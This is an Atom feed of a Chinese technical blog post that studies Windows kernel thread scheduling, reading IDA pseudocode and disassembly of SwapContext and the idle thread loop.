<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="https://xia0ji233.github.io/atom.xml" rel="self"/>
  
  <link href="https://xia0ji233.github.io/"/>
  <updated>2025-01-24T17:53:36.997Z</updated>
  <id>https://xia0ji233.github.io/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>windows进程与线程学习——深入研究线程调度（1）</title>
    <link href="https://xia0ji233.github.io/2025/01/25/WindowsProcess4/"/>
    <id>https://xia0ji233.github.io/2025/01/25/WindowsProcess4/</id>
    <published>2025-01-24T17:00:00.000Z</published>
    <updated>2025-01-24T17:53:36.997Z</updated>
    
    <content type="html"><![CDATA[<p>深入研究一下线程调度，由于篇幅较多，分章节分析</p><span id="more"></span><h2 id="SwapContext"><a href="#SwapContext" class="headerlink" title="SwapContext"></a>SwapContext</h2><p>首先研究一下 <code>SwapContext</code> 函数的实现。</p><h3 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h3><p>这里我们不去分析汇编代码，而是直接用 IDA + F5，把定义还原回去即可清晰地看出逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __usercall SwapContext@&lt;al&gt;(</span><br><span class="line">    _KPCR *PCR@&lt;ebx&gt;,</span><br><span class="line">    _KTHREAD *CurrentThread@&lt;edi&gt;,</span><br><span class="line">    _KTHREAD *NextThread@&lt;esi&gt;,</span><br><span class="line">    <span class="type">int</span> irql@&lt;ecx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> __int32 v5; <span class="comment">// ebp</span></span><br><span class="line">    <span class="type">char</span> *InitialStack; <span class="comment">// ecx</span></span><br><span class="line">    _EPROCESS *Process; <span class="comment">// ecx</span></span><br><span class="line">    _KPROCESS *v8; <span class="comment">// ebp</span></span><br><span class="line">    _KPROCESS *v9; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">void</span> *ArbitraryUserPointer; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">void</span> *NextThreadStackPointer; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">char</span> *v12; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> __int32 v13; <span class="comment">// ebp</span></span><br><span class="line">    <span class="type">int</span> v14; <span class="comment">// edx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">    _NT_TIB *Teb; <span class="comment">// eax</span></span><br><span class="line">    _KGDTENTRY *_GDT; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">int</span> v18; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">bool</span> v20; <span class="comment">// zf</span></span><br><span class="line">    _KGDTENTRY *GDT; <span class="comment">// ecx</span></span><br><span class="line">    _KPRCB *p_PrcbData; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line">    <span class="type">char</span> v24; <span class="comment">// [esp-Ch] [ebp-Ch]</span></span><br><span class="line">    _EXCEPTION_REGISTRATION_RECORD *ExceptionList; <span class="comment">// [esp-8h] [ebp-8h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v26; <span class="comment">// [esp-4h] [ebp-4h]</span></span><br><span class="line">    _UNKNOWN *retaddr; <span class="comment">// [esp+0h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( NextThread-&gt;Running )</span><br><span class="line">        _mm_pause();</span><br><span class="line">    NextThread-&gt;Running = <span class="number">1</span>;</span><br><span class="line">    v26 = irql;</span><br><span class="line">    _disable();</span><br><span class="line">    --PCR-&gt;PrcbData.NestingLevel;</span><br><span class="line">    v4 = __rdtsc() - PCR-&gt;PrcbData.StartCycles;</span><br><span class="line">    PCR-&gt;PrcbData.HighCycleTime = (v4 + __PAIR64__(PCR-&gt;PrcbData.HighCycleTime, PCR-&gt;PrcbData.CycleTime)) &gt;&gt; <span class="number">0x20</span>;</span><br><span class="line">    PCR-&gt;PrcbData.CycleTime += v4;</span><br><span class="line">    PCR-&gt;PrcbData.StartCycles += v4;</span><br><span class="line">    <span class="keyword">if</span> ( (NextThread-&gt;Header.ThreadControlFlags &amp; <span class="number">5</span>) == <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="keyword">if</span> ( (NextThread-&gt;Header.ThreadControlFlags &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">        KiBeginCounterAccumulation(NextThread, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (NextThread-&gt;Header.ThreadControlFlags &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ExceptionList = (_EXCEPTION_REGISTRATION_RECORD *)NextThread;</span><br><span class="line">        v24 = <span class="number">1</span>;</span><br><span class="line">        p_PrcbData = &amp;PCR-&gt;PrcbData;</span><br><span class="line">        _enable();</span><br><span class="line">        PsCheckThreadCpuQuota((<span class="type">int</span>)p_PrcbData, v24, (<span class="type">int</span>)ExceptionList);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_4:</span><br><span class="line">        _enable();</span><br><span class="line">    &#125;</span><br><span class="line">    ++PCR-&gt;NtTib.Version;</span><br><span class="line">    ExceptionList = PCR-&gt;NtTib.ExceptionList;</span><br><span class="line">    v5 = __readcr0();</span><br><span class="line">    <span class="keyword">if</span> ( CurrentThread-&gt;NpxState )</span><br><span class="line">    &#123;</span><br><span class="line">        InitialStack = (<span class="type">char</span> *)CurrentThread-&gt;InitialStack;</span><br><span class="line">        <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xE</span>) != <span class="number">0</span> )</span><br><span class="line">            __writecr0(v5 &amp; <span class="number">0xFFFFFFF1</span>);</span><br><span class="line">        _fxsave(InitialStack - <span class="number">528</span>);</span><br><span class="line">        CurrentThread-&gt;NpxState &amp;= <span class="number">0xF8</span>u;</span><br><span class="line">        PCR-&gt;PrcbData.NpxThread = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CurrentThread-&gt;KernelStack = &amp;ExceptionList;</span><br><span class="line">    Process = (_EPROCESS *)NextThread-&gt;Process;</span><br><span class="line">    <span class="keyword">if</span> ( Process != (_EPROCESS *)CurrentThread-&gt;Process )</span><br><span class="line">        KiUpdateSpeculationControl(Process);</span><br><span class="line">    v8 = NextThread-&gt;ApcState.Process;</span><br><span class="line">    v9 = CurrentThread-&gt;ApcState.Process;</span><br><span class="line">    <span class="keyword">if</span> ( v8 != v9 )</span><br><span class="line">    &#123;</span><br><span class="line">        ArbitraryUserPointer = PCR-&gt;NtTib.ArbitraryUserPointer;</span><br><span class="line">        _InterlockedXor((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)v8-&gt;ActiveProcessors.Bitmap, (<span class="type">unsigned</span> <span class="type">int</span>)ArbitraryUserPointer);</span><br><span class="line">        _InterlockedXor((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)v9-&gt;ActiveProcessors.Bitmap, (<span class="type">unsigned</span> <span class="type">int</span>)ArbitraryUserPointer);</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)&amp;v9-&gt;LdtDescriptor.LimitLow | *(_DWORD *)&amp;v8-&gt;LdtDescriptor.LimitLow )</span><br><span class="line">        &#123;</span><br><span class="line">            _EAX = *(_DWORD *)&amp;v8-&gt;LdtDescriptor.LimitLow;</span><br><span class="line">            <span class="keyword">if</span> ( _EAX )</span><br><span class="line">            &#123;</span><br><span class="line">                GDT = PCR-&gt;GDT;</span><br><span class="line">                *(_DWORD *)&amp;GDT[<span class="number">9</span>].LimitLow = _EAX;</span><br><span class="line">                GDT[<span class="number">9</span>].HighWord.Bits = v8-&gt;LdtDescriptor.HighWord.Bits;</span><br><span class="line">                PCR-&gt;IDT[<span class="number">0x21</span>] = v8-&gt;Int21Descriptor;</span><br><span class="line">                LOWORD(_EAX) = <span class="number">72</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            __asm &#123; lldt    ax &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        __writecr3(v8-&gt;DirectoryTableBase);</span><br><span class="line">    &#125;</span><br><span class="line">    NextThreadStackPointer = NextThread-&gt;InitialStack;</span><br><span class="line">    v12 = (<span class="type">char</span> *)NextThreadStackPointer - <span class="number">528</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (*((<span class="type">char</span> *)NextThreadStackPointer - <span class="number">554</span>) &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">        v12 = (<span class="type">char</span> *)NextThreadStackPointer - <span class="number">544</span>;</span><br><span class="line">    *((_DWORD *)PCR-&gt;NtTib.SubSystemTib + <span class="number">1</span>) = v12;</span><br><span class="line">    *((_WORD *)PCR-&gt;NtTib.SubSystemTib + <span class="number">51</span>) = v8-&gt;IopmOffset;</span><br><span class="line">    <span class="keyword">if</span> ( (dword_532FC4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        EtwTraceContextSwap((_ETHREAD *)CurrentThread, (_ETHREAD *)NextThread);</span><br><span class="line">        NextThreadStackPointer = NextThread-&gt;InitialStack;</span><br><span class="line">    &#125;</span><br><span class="line">    CurrentThread-&gt;Running = <span class="number">0</span>;</span><br><span class="line">    v13 = __readcr0();</span><br><span class="line">    <span class="keyword">if</span> ( (v13 &amp; <span class="number">0xE</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v13 &amp;= <span class="number">0xFFFFFFF1</span>;</span><br><span class="line">        __writecr0(v13);</span><br><span class="line">    &#125;</span><br><span class="line">    _fxrstor((<span class="type">char</span> *)NextThreadStackPointer - <span class="number">528</span>);</span><br><span class="line">    NextThread-&gt;NpxState |= <span class="number">7u</span>;</span><br><span class="line">    __writefsdword(<span class="number">0x5C0</span>u, (<span class="type">unsigned</span> <span class="type">int</span>)NextThread);<span class="comment">// NpxThread</span></span><br><span class="line">    v14 = *((_DWORD *)NextThreadStackPointer - <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (NextThread-&gt;NpxState &amp; <span class="number">7</span>) == <span class="number">0</span> )</span><br><span class="line">        v14 |= NpxStateNotLoaded;</span><br><span class="line">    v15 = v13 &amp; <span class="number">0xFFFFFFF1</span> | v14;</span><br><span class="line">    <span class="keyword">if</span> ( v15 != v13 )</span><br><span class="line">        __writecr0(v15);</span><br><span class="line">    Teb = (_NT_TIB *)NextThread-&gt;Teb;</span><br><span class="line">    PCR-&gt;NtTib.Self = Teb;</span><br><span class="line">    _GDT = PCR-&gt;GDT;</span><br><span class="line">    _GDT[<span class="number">7</span>].BaseLow = (<span class="type">unsigned</span> __int16)Teb;</span><br><span class="line">    Teb = (_NT_TIB *)((<span class="type">unsigned</span> <span class="type">int</span>)Teb &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    _GDT[<span class="number">7</span>].HighWord.Bytes.BaseMid = (<span class="type">unsigned</span> __int8)Teb;</span><br><span class="line">    _GDT[<span class="number">7</span>].HighWord.Bytes.BaseHi = BYTE1(Teb);</span><br><span class="line">    ++NextThread-&gt;ContextSwitches;</span><br><span class="line">    PCR-&gt;NtTib.ExceptionList = ExceptionList;</span><br><span class="line">    v18 = v26;</span><br><span class="line">    <span class="keyword">if</span> ( PCR-&gt;PrcbData.DpcRoutineActive )</span><br><span class="line">        KeBugCheckEx(<span class="number">0xB8</span>u, (ULONG_PTR)CurrentThread, (ULONG_PTR)NextThread, (ULONG_PTR)CurrentThread-&gt;InitialStack, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !NextThread-&gt;ApcState.KernelApcPending )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v20 = NextThread-&gt;SpecialApcDisable == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !NextThread-&gt;SpecialApcDisable )</span><br><span class="line">    &#123;</span><br><span class="line">        v20 = (_BYTE)v26 == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v26 )</span><br><span class="line">        &#123;</span><br><span class="line">            LOBYTE(v18) = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> ((<span class="type">unsigned</span> <span class="type">int</span>)&amp;retaddr | HalRequestSoftwareInterrupt(v18)) == <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v20;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 <code>_mm_pause();</code> 其实是汇编指令 <code>pause</code> 的实现，查阅 x86 手册可以看到说明：</p><p><code>Gives hint to processor that improves performance of spin-wait loops.</code> 主要是提高自旋锁循环等待的性能。</p><p>其中我们是可以看到一些切换线程必备的操作的：</p><p>如果切换的线程所属进程与当前进程不一致，则切换 cr3 为下一个线程所属进程的 cr3 值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v8 = NextThread-&gt;ApcState.Process;</span><br><span class="line">v9 = CurrentThread-&gt;ApcState.Process;</span><br><span class="line"><span class="keyword">if</span> ( v8 != v9 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    __writecr3(v8-&gt;DirectoryTableBase);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将当前线程的 TEB 保存到了段选择子为 <code>0x3b</code>（<code>gdt[7]</code>） 的段上，这个值是 <code>R3</code> 在 <code>fs</code> 所指示的段的基址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Teb = (_NT_TIB *)NextThread-&gt;Teb;</span><br><span class="line">PCR-&gt;NtTib.Self = Teb;</span><br><span class="line">_GDT = PCR-&gt;GDT;</span><br><span class="line">_GDT[<span class="number">7</span>].BaseLow = (<span class="type">unsigned</span> __int16)Teb;</span><br><span class="line">Teb = (_NT_TIB *)((<span class="type">unsigned</span> <span class="type">int</span>)Teb &gt;&gt; <span class="number">16</span>);</span><br><span class="line">_GDT[<span class="number">7</span>].HighWord.Bytes.BaseMid = (<span class="type">unsigned</span> __int8)Teb;</span><br><span class="line">_GDT[<span class="number">7</span>].HighWord.Bytes.BaseHi = BYTE1(Teb);</span><br><span class="line">++NextThread-&gt;ContextSwitches;</span><br></pre></td></tr></table></figure><h3 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h3><p>从伪代码似乎只能分析得到这么多了，由于 IDA 很难处理类似堆栈切换的函数，所以剩余的逻辑需要分析汇编语句，从伪代码 <code>CurrentThread-&gt;KernelStack = &amp;ExceptionList;</code> 处开始分析，其中，<code>edi</code> 指向了 <code>CurrentThread</code>，<code>esi</code> 指向了 <code>NextThread</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00458FDE                         loc_458FDE:                             ; CODE XREF: SwapContext()+63↑j</span><br><span class="line">.text:00458FDE 89 67 30                                mov     [edi+30h], esp</span><br><span class="line">.text:00458FE1 8B 46 28                                mov     eax, [esi+28h]</span><br><span class="line">.text:00458FE4 8B 66 30                                mov     esp, [esi+30h]</span><br><span class="line">.text:00458FE7 8B 8E 50 01 00 00                       mov     ecx, [esi+150h]</span><br><span class="line">.text:00458FED 3B 8F 50 01 00 00                       cmp     ecx, [edi+150h]</span><br><span class="line">.text:00458FF3 74 05                                   jz      short loc_458FFA</span><br></pre></td></tr></table></figure><p>这里给出 <code>KTHREAD</code> 参考</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   <span class="number">+0x028</span> InitialStack     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x030</span> KernelStack      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x150</span> Process          : Ptr32 _KPROCESS</span><br></pre></td></tr></table></figure><p>所以这段代码很明显就是，将当前 <code>esp</code> 的值保存到 <code>CurrentThread-&gt;KernelStack</code>，从 <code>NextThread-&gt;KernelStack</code> 取出值赋给 <code>esp</code>。</p><hr><p>中断门提权的时候，要取得保存在 <code>TSS</code> 中的 <code>esp0</code>，既然一个核只有一个 <code>TSS</code>，那么在切换线程的时候必然要把 <code>NextThread</code> 的 <code>esp</code> 给到 <code>TSS</code>，不然这个线程从中断门提权过来就会进入别的线程的栈。相关代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00459033                         loc_459033:                             ; CODE XREF: SwapContext()+DE↑j</span><br><span class="line">.text:00459033 8B 53 0C                                mov     edx, [ebx+0Ch]</span><br><span class="line">.text:00459036 89 42 04                                mov     [edx+4], eax</span><br><span class="line">.text:00459039 8B 53 0C                                mov     edx, [ebx+0Ch]</span><br><span class="line">.text:0045903C 66 8B 45 6E                             mov     ax, [ebp+6Eh]</span><br><span class="line">.text:00459040 66 89 42 66                             mov     [edx+66h], ax</span><br><span class="line">.text:00459044 F7 05 C4 2F 53 00 04 00                 test    ds:dword_532FC4, 4</span><br><span class="line">.text:00459044 00 00</span><br><span class="line">.text:0045904E 0F 85 0F 01 00 00                       jnz     loc_459163</span><br></pre></td></tr></table></figure><p>其中 <code>ebx+0xC</code> 刚好是 <code>KPCR.TssCopy</code> 其值与 <code>KPCR.TSS</code> 一致。在此地下一个断点，看看 <code>esp</code> 是否会在这里改变。</p><img src="/2025/01/25/WindowsProcess4/1.png" class=""><p>可以看出，在这个地方的确是将 <code>esp</code> 的值存入了 <code>Tss.esp0</code> 中，至于为什么没有存 <code>ss0</code>，大概是因为 <code>Tss</code> 只会在线程切换的时候修改，而线程切换都是在 <code>r0</code> 去做的，因此 <code>ss0==0x10</code> 恒成立。且仔细观察可以得知，该 <code>Tss</code> 似乎只有 <code>esp0</code> 和 <code>ss0</code> 两个字段上有值，其余值全为 0。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>线程切换的时候，会做如下操作：</p><ol><li>保存 ExceptionList</li><li>切换 esp</li><li>判断目标线程与当前线程是否属于同一进程，如果不属于则切换 CR3</li><li>将当前线程的 esp0 写入 Tss 寄存器</li><li>根据当前线程的 PEB 写入段选择子为 0x3b 的描述符表。</li></ol><h2 id="空闲线程分析"><a href="#空闲线程分析" class="headerlink" title="空闲线程分析"></a>空闲线程分析</h2><p>空闲线程即<strong>IdleThread</strong>，当CPU空闲的时候会执行这个线程，可以直接通过 KPCR 结构找到该线程，并观察它所执行的代码。</p><img src="/2025/01/25/WindowsProcess4/2.png" class=""><p>去 IDA 里面查看这个函数，可以发现就是做一些无意义的指令，让 CPU 别闲下来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">text:004594B0                         @KiIdleLoop@0   proc near               ; CODE XREF: KiSystemStartup(x)+20B↓j</span><br><span class="line">.text:004594B0                                                                 ; DATA XREF: KiInitializeThread(x,x,x,x)+14↑o ...</span><br><span class="line">.text:004594B0 EB 0B                                   jmp     short loc_4594BD</span><br><span class="line">.text:004594B2                         ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004594B2</span><br><span class="line">.text:004594B2                         loc_4594B2:                             ; CODE XREF: KiIdleLoop()+ED↓j</span><br><span class="line">.text:004594B2 8D 8B 20 01 00 00                       lea     ecx, [ebx+120h]</span><br><span class="line">.text:004594B8 E8 5D 24 00 00                          call    @PoIdle@4       ; PoIdle(x)</span><br><span class="line">.text:004594BD</span><br><span class="line">.text:004594BD                         loc_4594BD:                             ; CODE XREF: KiIdleLoop()↑j</span><br><span class="line">.text:004594BD                                                                 ; KiIdleLoop()+CE↓j ...</span><br><span class="line">.text:004594BD 80 3D 29 5A 56 00 00                    cmp     ds:_HvlEnableIdleYield, 0</span><br><span class="line">.text:004594C4 74 02                                   jz      short loc_4594C8</span><br><span class="line">.text:004594C6 F3 90                                   pause</span><br><span class="line">.text:004594C8</span><br><span class="line">.text:004594C8                         loc_4594C8:                             ; CODE XREF: KiIdleLoop()+14↑j</span><br><span class="line">.text:004594C8 FB                                      sti</span><br><span class="line">.text:004594C9 90                                      nop</span><br><span class="line">.text:004594CA 90                                      nop</span><br><span class="line">.text:004594CB FA                                      cli</span><br><span class="line">.text:004594CC F6 83 54 1A 00 00 3F                    test    byte ptr [ebx+1A54h], 3Fh</span><br><span class="line">.text:004594D3 74 13                                   jz      short loc_4594E8</span><br><span class="line">.text:004594D5 B1 02                                   mov     cl, 2</span><br><span class="line">.text:004594D7 FF 15 A8 10 40 00                       call    ds:__imp_@HalClearSoftwareInterrupt@4 ; HalClearSoftwareInterrupt(x)</span><br><span class="line">.text:004594DD 8D 8B 20 01 00 00                       lea     ecx, [ebx+120h]</span><br><span class="line">.text:004594E3 E8 0B 01 00 00                          call    @KiRetireDpcList@4 ; KiRetireDpcList(x)</span><br><span class="line">.text:004594E8</span><br><span class="line">.text:004594E8                         loc_4594E8:                             ; CODE XREF: KiIdleLoop()+23↑j</span><br><span class="line">.text:004594E8 83 BB 28 01 00 00 00                    cmp     dword ptr [ebx+128h], 0</span><br><span class="line">.text:004594EF 0F 84 A1 00 00 00                       jz      loc_459596</span><br><span class="line">.text:004594F5 FB                                      sti</span><br><span class="line">.text:004594F6 8B BB 24 01 00 00                       mov     edi, [ebx+124h]</span><br><span class="line">.text:004594FC F0 0F BA AB 3C 1A 00 00                 lock bts dword ptr [ebx+1A3Ch], 0</span><br><span class="line">.text:004594FC 00</span><br><span class="line">.text:00459505 73 0D                                   jnb     short loc_459514</span><br><span class="line">.text:00459507 8D 8B 3C 1A 00 00                       lea     ecx, [ebx+1A3Ch] ; SpinLock</span><br><span class="line">.text:0045950D E8 CE 03 00 00                          call    @KefAcquireSpinLockAtDpcLevel@4 ; KefAcquireSpinLockAtDpcLevel(x)</span><br><span class="line">.text:00459512 EB 07                                   jmp     short loc_45951B</span><br><span class="line">.text:00459514                         ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00459514</span><br><span class="line">.text:00459514                         loc_459514:                             ; CODE XREF: KiIdleLoop()+55↑j</span><br><span class="line">.text:00459514 64 FF 05 80 36 00 00                    inc     large dword ptr fs:3680h</span><br><span class="line">.text:0045951B</span><br><span class="line">.text:0045951B                         loc_45951B:                             ; CODE XREF: KiIdleLoop()+62↑j</span><br><span class="line">.text:0045951B 8B B3 28 01 00 00                       mov     esi, [ebx+128h]</span><br><span class="line">.text:00459521 3B F7                                   cmp     esi, edi</span><br><span class="line">.text:00459523 74 5E                                   jz      short loc_459583</span><br><span class="line">.text:00459525 83 A3 28 01 00 00 00                    and     dword ptr [ebx+128h], 0</span><br><span class="line">.text:0045952C FA                                      cli</span><br><span class="line">.text:0045952D 0F 31                                   rdtsc</span><br><span class="line">.text:0045952F 2B 83 18 33 00 00                       sub     eax, [ebx+3318h]</span><br><span class="line">.text:00459535 1B 93 1C 33 00 00                       sbb     edx, [ebx+331Ch]</span><br><span class="line">.text:0045953B 8B 4F 10                                mov     ecx, [edi+10h]</span><br><span class="line">.text:0045953E 03 C8                                   add     ecx, eax</span><br><span class="line">.text:00459540 11 57 18                                adc     [edi+18h], edx</span><br><span class="line">.text:00459543 01 47 10                                add     [edi+10h], eax</span><br><span class="line">.text:00459546 11 57 14                                adc     [edi+14h], edx</span><br><span class="line">.text:00459549 01 83 18 33 00 00                       add     [ebx+3318h], eax</span><br><span class="line">.text:0045954F 11 93 1C 33 00 00                       adc     [ebx+331Ch], edx</span><br><span class="line">.text:00459555 FB                                      sti</span><br><span class="line">.text:00459556 FE 83 31 01 00 00                       inc     byte ptr [ebx+131h]</span><br><span class="line">.text:0045955C 89 B3 24 01 00 00                       mov     [ebx+124h], 